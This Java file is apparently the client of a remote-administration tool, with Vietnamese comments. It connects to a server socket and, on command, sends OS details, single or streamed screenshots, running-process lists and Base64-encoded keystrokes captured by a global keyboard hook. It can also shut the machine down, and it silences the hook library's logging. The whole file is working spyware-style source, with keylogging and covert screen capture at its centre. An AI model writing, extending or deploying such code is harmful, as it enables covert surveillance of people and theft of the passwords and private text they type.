package Controller;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.util.Base64;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;

public class User {
    private static boolean sendingScreenshots = false;
    private static boolean sendingKeylogger = false;
    private static PrintWriter out;
    private static StringBuilder keyLogBuffer = new StringBuilder();
    private static ScheduledExecutorService keyLogScheduler;

    public static void main(String[] args) {
        String serverAddress = "localhost"; // Địa chỉ server
        int serverPort = 5254; // Cổng server

        try (Socket socket = new Socket(serverAddress, serverPort);
             PrintWriter out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {

            // Gửi thông báo kết nối user
            out.println("USER");

            User.out = out;

            // Đăng ký sự kiện shutdown hook để đóng kết nối khi thoát chương trình
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }));

            // Thiết lập và bắt đầu lắng nghe các lệnh từ server
            listenForCommands(in);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void listenForCommands(BufferedReader in) {
        try {
            while (true) {
                String serverCommand = in.readLine();
                if (serverCommand == null) {
                    break;
                }

                System.out.println("Command from server: " + serverCommand);

                switch (serverCommand) {
                    case "OS_INFO":
                        String osInfo = getOSInfo();
                        out.println("OS_INFO:" + osInfo);
                        break;

                    case "SCREENSHOT":
                        String base64Image = takeScreenshot();
                        out.println("SCREENSHOT:" + base64Image);
                        break;

                    case "SHUTDOWN":
                        performShutdown();
                        break;

                    case "START_VIDEO":
                        startSendingScreenshots();
                        break;

                    case "STOP_VIDEO":
                        stopSendingScreenshots();
                        break;

                    case "STARTKEYLLOGER":
                        startKeylogging();                   
                        break;

                    case "STOP_KEYLOGGING":
                        stopKeylogging();
                        break;
                     case "GET_RUNNING_APPLICATIONS":
                         String process = getRunningProcess();
                         out.println("RUNNING_APPLICATIONS:"+process);
                        break;

                 

                    default:
                        System.out.println("Unknown command: " + serverCommand);
                        break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static String takeScreenshot() {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            javax.imageio.ImageIO.write(screenFullImage, "png", baos);
            byte[] imageBytes = baos.toByteArray();
            return Base64.getEncoder().encodeToString(imageBytes);
        } catch (AWTException | IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    private static String getOSInfo() {
        try {
            String osName = System.getProperty("os.name");
            String osVersion = System.getProperty("os.version");
            String osArch = System.getProperty("os.arch");
            long totalMemory = Runtime.getRuntime().totalMemory();

            return String.format("OS Name: %s\nOS Version: %s\nOS Architecture: %s\nTotal Memory: %d", osName, osVersion, osArch, totalMemory);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private static void performShutdown() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                // Hiển thị thông báo trên Windows
                Runtime.getRuntime().exec("cmd /c msg * /TIME:5 System will shut down in 5 seconds");
                Thread.sleep(1000); // Đợi một chút trước khi chạy lệnh shutdown
                Runtime.getRuntime().exec("shutdown -s -t 0");
            } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                // Hiển thị thông báo trên Linux/Unix hoặc MacOS
                String shutdownCommand = os.contains("mac") ? "sudo shutdown -h now" : "shutdown -h now";

                if (os.contains("nix") || os.contains("nux")) {
                    // Hiển thị thông báo trên Linux/Unix
                    Runtime.getRuntime().exec("notify-send 'System Shutdown' 'System will shut down in 5 seconds'");
                } else if (os.contains("mac")) {
                    // Hiển thị thông báo trên MacOS
                    Runtime.getRuntime().exec("osascript -e 'display notification \"System will shut down in 5 seconds\" with title \"System Shutdown\"'");
                }

                Thread.sleep(5000); // Đợi 5 giây trước khi tắt máy
                Runtime.getRuntime().exec(shutdownCommand);
            } else {
                // Xử lý cho các hệ điều hành khác
                System.err.println("Unsupported operating system for shutdown");
            }
        } catch (IOException | InterruptedException ex) {
            ex.printStackTrace();
        }
    }

    private static void startSendingScreenshots() {
        sendingScreenshots = true;
        Thread screenshotThread = new Thread(() -> {
            while (sendingScreenshots) {
                String base64Image = takeScreenshot();
                if (base64Image != null) {
                    out.println("SCREENSHOT:" + base64Image);
                }
                try {
                    Thread.sleep(100); // Đợi giữa các lần chụp màn hình
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        screenshotThread.start();
    }

    private static void stopSendingScreenshots() {
        sendingScreenshots = false;
    }

    private static void startKeylogging() {
    try {
        GlobalScreen.registerNativeHook();
    } catch (NativeHookException ex) {
        System.err.println("Failed to register native hook: " + ex.getMessage());
        return;
    }

    GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
        @Override
        public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
            char ch = nativeKeyEvent.getKeyChar();
            synchronized (keyLogBuffer) {
                keyLogBuffer.append(ch);
            }
        }

        @Override
        public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
            // Không cần xử lý khi phím được nhả ra
        }

        @Override
        public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
            // Không cần xử lý khi phím được gõ
        }
    });

    java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
    logger.setLevel(Level.OFF);
    logger.setUseParentHandlers(false);

    keyLogScheduler = Executors.newSingleThreadScheduledExecutor();
    keyLogScheduler.scheduleAtFixedRate(() -> {
        synchronized (keyLogBuffer) {
            if (keyLogBuffer.length() > 0) {
                String base64KeylogData = Base64.getEncoder().encodeToString(keyLogBuffer.toString().getBytes());
                out.println("KEYLOG:" + base64KeylogData);
                keyLogBuffer.setLength(0);
            }
        }
    }, 1, 1, TimeUnit.SECONDS);
}


    private static void stopKeylogging() {
        sendingKeylogger = false;
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("Failed to unregister native hook: " + ex.getMessage());
        }
        if (keyLogScheduler != null && !keyLogScheduler.isShutdown()) {
            keyLogScheduler.shutdown();
        }
        // Gửi bất kỳ dữ liệu keylog còn lại
        synchronized (keyLogBuffer) {
            if (keyLogBuffer.length() > 0) {
                out.println("KEYLOG:" + keyLogBuffer.toString());
                keyLogBuffer.setLength(0); // Clear buffer
            }
        }
    }
    
    private static String getRunningProcess() {
    StringBuilder getRunningProcess = new StringBuilder();
    try {
        ProcessBuilder processBuilder;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            // Windows
            processBuilder = new ProcessBuilder("tasklist.exe");
        } else {
            // Unix-like systems
            processBuilder = new ProcessBuilder("ps", "-e");
        }
        
        Process process = processBuilder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            getRunningProcess.append(line).append("\n");
        }
        
        reader.close();
        process.waitFor();
        
    } catch (IOException | InterruptedException e) {
        e.printStackTrace();
    }
    return getRunningProcess.toString();
}


   

   

    
}
